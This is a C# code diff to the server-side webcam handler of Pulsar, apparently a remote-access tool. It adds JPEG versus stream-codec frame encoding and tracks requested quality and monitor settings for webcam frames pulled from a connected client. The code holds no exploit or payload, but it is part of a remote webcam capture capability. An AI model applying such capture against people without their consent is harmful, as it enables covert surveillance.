@@ -4,6 +4,7 @@ using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Messages.Webcam;
 using Pulsar.Common.Networking;
 using Pulsar.Common.Video.Codecs;
+using Pulsar.Common.Video;
 using Pulsar.Server.Networking;
 using System;
 using System.Collections.Concurrent;
@@ -107,6 +108,11 @@ namespace Pulsar.Server.Messages
         /// The video stream codec used to decode received frames.
         /// </summary>
         private UnsafeStreamCodec _codec;
+        private WebcamEncoding _preferredEncoding = WebcamEncoding.Jpeg;
+        private WebcamEncoding _currentEncoding = WebcamEncoding.Stream;
+        private int _requestedQuality;
+        private int _requestedMonitor;
+        private Resolution _requestedResolution;
 
         // buffer parameters
         private readonly int _initialFramesRequested = 5; // request 5 frames initially
@@ -144,6 +150,15 @@ namespace Pulsar.Server.Messages
         /// Shows the last FPS reported by the client, or estimated FPS if not available.
         /// </summary>
         public float CurrentFps => _lastReportedFps > 0 ? _lastReportedFps : (float)_estimatedFps;
+
+        /// <summary>
+        /// Gets or sets the preferred encoding used when requesting webcam frames from the client.
+        /// </summary>
+        public WebcamEncoding PreferredEncoding
+        {
+            get => _preferredEncoding;
+            set => _preferredEncoding = value;
+        }
 
         /// <summary>
         /// Initializes a new instance of the <see cref="RemoteWebcamHandler"/> class using the given client.
@@ -192,6 +207,10 @@ namespace Pulsar.Server.Messages
                 IsStarted = true;
                 _codec?.Dispose();
                 _codec = null;
+                _currentEncoding = _preferredEncoding;
+                _requestedQuality = quality;
+                _requestedMonitor = display;
+                _requestedResolution = null;
 
                 // Reset buffering counters
                 _pendingFrames = _initialFramesRequested;
@@ -207,7 +226,8 @@ namespace Pulsar.Server.Messages
                     DisplayIndex = display,
                     Status = RemoteWebcamStatus.Start,
                     IsBufferedMode = IsBufferedMode,
-                    FramesRequested = _initialFramesRequested
+                    FramesRequested = _initialFramesRequested,
+                    Encoding = _preferredEncoding
                 });
             }
         }
@@ -257,11 +277,10 @@ namespace Pulsar.Server.Messages
                 if (!IsStarted)
                     return;
 
-                if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
-                {
-                    _codec?.Dispose();
-                    _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
-                }
+                _currentEncoding = message.Encoding;
+                _requestedQuality = message.Quality;
+                _requestedMonitor = message.Monitor;
+                _requestedResolution = message.Resolution ?? _requestedResolution;
 
                 if (message.Image != null)
                 {
@@ -271,20 +290,100 @@ namespace Pulsar.Server.Messages
                     Interlocked.Increment(ref _frameBytesSamples);
                 }
 
-                using (var ms = new MemoryStream(message.Image))
+                if (message.Image != null && message.Image.Length > 0)
                 {
-                    try
+                    if (_currentEncoding == WebcamEncoding.Stream)
                     {
-                        var decoded = _codec.DecodeData(ms);
-                        if (decoded != null)
+                        if (_codec == null || _codec.ImageQuality != message.Quality || _codec.Monitor != message.Monitor || _codec.Resolution != message.Resolution)
                         {
-                            EnsureLocalResolutionInitialized(decoded.Size);
-                            OnReport(decoded);
+                            _codec?.Dispose();
+                            _codec = new UnsafeStreamCodec(message.Quality, message.Monitor, message.Resolution);
+                        }
+
+                        using (var ms = new MemoryStream(message.Image))
+                        {
+                            try
+                            {
+                                var decoded = _codec.DecodeData(ms);
+                                if (decoded != null)
+                                {
+                                    EnsureLocalResolutionInitialized(decoded.Size);
+
+                                    Bitmap frameForUi = null;
+                                    try
+                                    {
+                                        frameForUi = (Bitmap)decoded.Clone();
+                                    }
+                                    catch (Exception cloneEx)
+                                    {
+                                        Debug.WriteLine($"Error cloning decoded frame: {cloneEx.Message}");
+                                    }
+
+                                    if (frameForUi == null)
+                                    {
+                                        frameForUi = decoded;
+                                        decoded = null;
+                                    }
+
+                                    if (frameForUi != null)
+                                    {
+                                        OnReport(frameForUi);
+                                    }
+
+                                    decoded?.Dispose();
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                Debug.WriteLine($"Error decoding frame: {ex.Message}");
+                            }
                         }
                     }
-                    catch (Exception ex)
+                    else
                     {
-                        Debug.WriteLine($"Error decoding frame: {ex.Message}");
+                        _codec?.Dispose();
+                        _codec = null;
+
+                        Bitmap decodedFrame = null;
+                        try
+                        {
+                            using (var ms = new MemoryStream(message.Image))
+                            using (var temp = new Bitmap(ms))
+                            {
+                                decodedFrame = new Bitmap(temp);
+                            }
+
+                            if (decodedFrame != null)
+                            {
+                                EnsureLocalResolutionInitialized(decodedFrame.Size);
+
+                                Bitmap frameForUi = null;
+                                try
+                                {
+                                    frameForUi = (Bitmap)decodedFrame.Clone();
+                                }
+                                catch (Exception cloneEx)
+                                {
+                                    Debug.WriteLine($"Error cloning JPEG frame: {cloneEx.Message}");
+                                }
+
+                                if (frameForUi == null)
+                                {
+                                    frameForUi = decodedFrame;
+                                    decodedFrame = null;
+                                }
+
+                                OnReport(frameForUi);
+                            }
+                        }
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine($"Error decoding JPEG frame: {ex.Message}");
+                        }
+                        finally
+                        {
+                            decodedFrame?.Dispose();
+                        }
                     }
                 }
 
@@ -334,14 +433,18 @@ namespace Pulsar.Server.Messages
                 Debug.WriteLine($"Requesting {batchSize} more frames");
                 Interlocked.Add(ref _pendingFrames, batchSize);
 
+                int quality = _requestedQuality != 0 ? _requestedQuality : (_codec?.ImageQuality ?? 75);
+                int monitor = _requestedMonitor;
+
                 _client.Send(new GetWebcam
                 {
                     CreateNew = false,
-                    Quality = _codec?.ImageQuality ?? 75,
-                    DisplayIndex = _codec?.Monitor ?? 0,
+                    Quality = quality,
+                    DisplayIndex = monitor,
                     Status = RemoteWebcamStatus.Continue,
                     IsBufferedMode = true,
-                    FramesRequested = batchSize
+                    FramesRequested = batchSize,
+                    Encoding = _currentEncoding
                 });
             }
             finally
